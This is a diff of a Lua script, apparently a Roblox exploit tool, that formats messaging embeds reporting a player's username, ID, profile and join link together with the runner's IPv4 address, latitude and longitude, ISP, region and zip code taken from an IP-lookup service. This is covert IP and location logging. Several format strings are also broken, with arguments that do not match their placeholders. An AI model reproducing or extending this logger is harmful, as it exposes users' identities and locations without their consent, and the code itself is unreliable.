@@ -56,11 +56,11 @@ do
                         ["fields"] = {
                             {
                             ["name"] = "Data",
-                            ["value"] = string.format('\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
+                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplay: %s\nID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                             },
                             {
                             ["name"] = "Personal",
-                            ["value"] = string.format("*IPV4: ||%s||*\n* *\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
+                            ["value"] = string.format("*IPV4: ||%s||*\n*Longitude: %s/%s*\n*ISP*: %s\n*Used: %s*\n*Region: %s/%s*\n*Zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                             }
                         },
                         ["author"] = {
@@ -122,7 +122,7 @@ do
                 ["fields"] = {
                     {
                     ["name"] = "Data",
-                    ["value"] = string.format('\nUsername: %s\nDisplay: %s\nID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
+                    ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplay: %s\nID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                     }
                 },
                 ["author"] = {
